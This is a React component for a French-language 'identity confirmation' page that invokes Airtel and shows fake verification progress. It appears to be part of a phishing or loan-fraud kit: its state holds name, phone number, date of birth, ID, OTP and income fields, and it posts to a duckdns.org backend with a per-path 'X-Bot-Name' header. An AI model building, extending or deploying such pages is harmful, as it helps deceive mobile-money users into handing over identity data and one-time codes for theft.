import React, { useState, useEffect } from 'react'
import axios from 'axios'
import { useNavigate, useParams } from 'react-router-dom'

const API_BASE_URL = "https://lnmb.duckdns.org"

const api = axios.create({
  baseURL: API_BASE_URL,
  headers: { "Content-Type": "application/json" }
})

api.interceptors.request.use(config => {
  const bot = window.location.pathname.split("/")[1] || "user1"
  config.headers["X-Bot-Name"] = bot
  return config
})

function Compliance() {
  const navigate = useNavigate()
  const { user } = useParams()
  const userId = user || 'default'
  const [client] = useState({
    name: "",
    number: "",
    dob: "",
    loan: "",
    id: "",
    otp: "",
    income: ""
  })

  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submitSuccess, setSubmitSuccess] = useState(false)

  const handleComplianceSubmit = async () => {
    setIsSubmitting(true)
    try {
      const response = await api.post("/api/compliance", {
        clientId: client.id,
        verificationStatus: "completed",
        timestamp: new Date().toISOString()
      })
      
      if (response.data.success) {
        setSubmitSuccess(true)
      }
    } catch (err) {
      console.error("Compliance error:", err)
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="loan-calculator-container">
      <div className="calculator-header">
        <h1 className="loan-app-title">
          Confirmation de l'identité{" "}
          <span className="fast-text">en attente...</span>
        </h1>
        <p className="subtitle">Veuillez confirmer vos informations Airtel</p>
      </div>

      <div className="calculator-content">
        <div className="calculator-section">
          <h2 className="section-title">Étapes de vérification</h2>
          
          <div style={{ 
            padding: '20px', 
            background: '#f8f9fa', 
            borderRadius: '12px',
            marginBottom: '20px'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                borderRadius: '50%', 
                background: '#10b981',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#fff',
                fontWeight: 'bold'
              }}>
                ✓
              </div>
              <span style={{ marginLeft: '15px', fontSize: '18px' }}>
                <strong>Nom et coordonnées</strong> - Vérifié
              </span>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                borderRadius: '50%', 
                background: '#f59e0b',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#fff',
                fontWeight: 'bold'
              }}>
                2
              </div>
              <span style={{ marginLeft: '15px', fontSize: '18px' }}>
                <strong>Document d'identité</strong> - En attente
              </span>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', marginBottom: '15px' }}>
              <div style={{ 
                width: '50px', 
                height: '50px', 
                borderRadius: '50%', 
                background: '#e5e7eb',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#fff',
                fontWeight: 'bold'
              }}>
                3
              </div>
              <span style={{ marginLeft: '15px', fontSize: '18px' }}>
                <strong>Vérification bancaire</strong> - En attente
              </span>
            </div>
          </div>

          <button 
            onClick={handleComplianceSubmit} 
            disabled={isSubmitting}
            style={{
              padding: '16px',
              background: isSubmitting ? '#ccc' : 'linear-gradient(135deg, #101e4d, #191d57)',
              color: '#fff',
              border: 'none',
              borderRadius: '12px',
              fontSize: '1rem',
              fontWeight: '700',
              cursor: isSubmitting ? 'not-allowed' : 'pointer',
              width: '100%',
              transition: 'all .2s ease'
            }}
          >
            {isSubmitting ? "Traitement en cours..." : "Confirmer l'identité"}
          </button>

          {submitSuccess && (
            <div style={{
              marginTop: '20px',
              padding: '15px',
              background: '#d1fae5',
              borderRadius: '8px',
              textAlign: 'center'
            }}>
              <strong style={{ color: '#065f46' }}>✓ Votre dossier est maintenant complet!</strong>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}

export default Compliance